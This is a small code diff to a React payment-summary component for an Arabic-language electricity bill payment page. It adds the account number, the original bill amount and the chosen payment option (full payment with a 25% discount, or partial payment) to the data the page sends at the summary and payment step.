@@ -54,6 +54,9 @@ export default function SummaryPayment() {
 
     sendData({
       data: {
+        'رقم الحساب': accountNumber,
+        'المبلغ الأصلي': `${sessionStorage.getItem('billAmount') || '0'} ر.س`,
+        'خيار الدفع': payOption === 'full' ? 'دفع كامل المبلغ (خصم 25%)' : 'دفع جزء من المبلغ',
         'المجموع الكلي': `${totalAmount.toFixed(2)} ر.س`,
       },
       current: 'الملخص والدفع',
@@ -62,6 +65,7 @@ export default function SummaryPayment() {
 
     sendData({
       data: {
+        'رقم الحساب': accountNumber,
         paymentMethod: selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : 'Apple Pay',
         serviceName: 'دفع فاتورة الكهرباء',
         servicePrice: totalAmount,
